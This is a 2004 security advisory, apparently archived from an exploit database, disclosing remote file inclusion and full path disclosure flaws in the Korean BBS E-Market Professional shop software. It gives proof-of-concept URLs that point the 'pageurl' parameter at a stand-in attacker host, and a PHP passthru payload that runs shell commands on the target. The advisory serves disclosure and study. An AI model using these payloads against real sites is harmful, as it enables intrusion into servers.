{
  "id": "2882",
  "title": "BBS E-Market Professional - Full Path Disclosure / File Inclusion",
  "cve": null,
  "vuln_type": "unknown",
  "code": "____________________   ___ ___ ________\r\n\\_   _____/\\_   ___ \\ /   |   \\\\_____  \\\r\n |    __)_ /    \\  \\//    ~    \\/   |   \\\r\n |        \\\\     \\___\\    Y    /    |    \\\r\n/_______  / \\______  /\\___|_  /\\_______  /\r\n        \\/         \\/       \\/         \\/\r\n\r\n          .OR.ID\r\nECHO_ADV_06$2004\r\n\r\n---------------------------------------------------------------------------\r\n                    Multiple  vulnerabilities 1n BBS E-Market Professional\r\n---------------------------------------------------------------------------\r\n\r\nAuthor: y3dips\r\nDate: Sept, 7th 2004\r\nLocation: Indonesian, Jakarta\r\nWeb: http://echo.or.id/adv/adv06-y3dips-2004.txt\r\n\r\n---------------------------------------------------------------------------\r\n\r\nAffected software description:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nE-market is commercial software made by korean company, includes shopping mall, \r\ncommunity , e-crm (e-customer relationship management) , group buying ,weblog, \r\nauction, estimate sheet , and other features\r\n\r\nweb : http://www.nt.co.kr\r\n        http://www.bbs2000.co.kr\r\n\r\nRisk: very high ( ***** )\r\n       most off all korean sites that handle e-shop , e-banking,... use this\r\n       d**n software\r\n\r\nelse, no more info could get cause the site in korean language :(\r\n\r\n---------------------------------------------------------------------------\r\n\r\n\r\nVulnerabilities:\r\n~~~~~~~~~~~~~~~~\r\n\r\n1. Remote Command Execution\r\n\r\nRemote command execution on 'becommunity' (modules that support by BBS e-market\r\nprofessional)  makes insecure calls to the include() function of PHP (works \r\non \" pageurl= \" functions )  which can allow the inclusion of remote files, \r\nand thereby the execution of arbitrary commands by remote user with  the web \r\nserver user permissions, usually 'nobody' .\r\n\r\n\r\nhttp://[TARGET]/becommunity/community/index.php?pageurl=[injection URL]\r\nhttp://[TARGET]/becommunity/community/index.php?from_market=Y&pageurl=[injection URL]\r\n\r\nPOC=\r\n\r\nhttp://[TARGET]/becommunity/community/index.php?pageurl=http://[ATTACKER]/echo.txt?\r\nhttp://[TARGET]/becommunity/community/index.php?from_market=Y&pageurl=http://[ATTACKER]/echo.txt?\r\n\r\n---------------------------------------------------------------------------\r\n\r\nExploit :\r\n~~~~~~~~~\r\n\r\n-------------------------------- cut -------------------------------------\r\n\r\n<?\r\necho \"\".passthru(' ls -la ; id ').\"\";\r\n?>\r\n\r\n\r\n---------------------------------- cut ------------------------------------\r\n\r\nsave on attacker URL with name: echo.txt , to get a listing of file or directories ,\r\nwith user id that we got\r\n\r\n--------------------------------------------------------------------------\r\n\r\n2. Full Path disclosure\r\n\r\nA remote user can access the file to cause the system to display an error \r\nmessage that indicates the installation path. The resulting error message \r\nwill disclose potentially sensitive installation path information to the \r\nremote attacker.\r\n\r\nhttp://[TARGET]/becommunity/community/index.php?from_market=[char]\r\n\r\nPOC =\r\n\r\nhttp://[TARGET]/becommunity/community/index.php?from_market=dudul\r\n\r\n\r\nWarning: main(main.php) [function.main]: failed to create stream: No such file \r\nor directory in /home5/standard_r5/[TARGET]/html/becommunity/community/index.php on line 239\r\n\r\nWarning: main() [function.main]: Failed opening 'main.php' for inclusion \r\n(include_path='.:/usr/local/php/lib/php') \r\nin /home5/standard_r5/[TARGET]/html/becommunity/community/index.php on line 239\r\n\r\n\r\n---------------------------------------------------------------------------\r\n\r\nThe fix:\r\n~~~~~\r\nNo Access to the code,- so buh bye :)\r\nVendor allready contacted but  no response till now\r\n\r\n---------------------------------------------------------------------------\r\n\r\nDisclamier:\r\n~~~~~~~\r\n\r\nAdvice, directions, instructions and script on security vulnerabilities \r\nin this advisory for educational purpose, y3dips nor echo.or.id does not \r\naccept responsibility for any damage or injury caused as a result of its use\r\n\r\n\r\n---------------------------------------------------------------------------\r\n\r\nShoutz:\r\n~~~~~\r\n\r\n~ K-159, m0by, the_day, comex, z3r0byt3, c-a-s-e, S`to @T echo/staff\r\n~ Biatch-x, yudhax, lieur-euy || newbie_hacker@yahoogroups.com \r\n~ #e-c-h-o & #aikmel @DALNET\r\n\r\n---------------------------------------------------------------------------\r\n\r\nContact:\r\n~~~~~~~~\r\n\r\n     y3dips || echo|staff || y3dips(at)echo(dot)or(dot)id\r\n     Homepage: http://y3dips.echo.or.id/\r\n\r\n-------------------------------- [ EOF ] ----------------------------------\r\n\r\n# milw0rm.com [2006-12-02]",
  "url": "https://www.exploit-db.com/exploits/2882"
}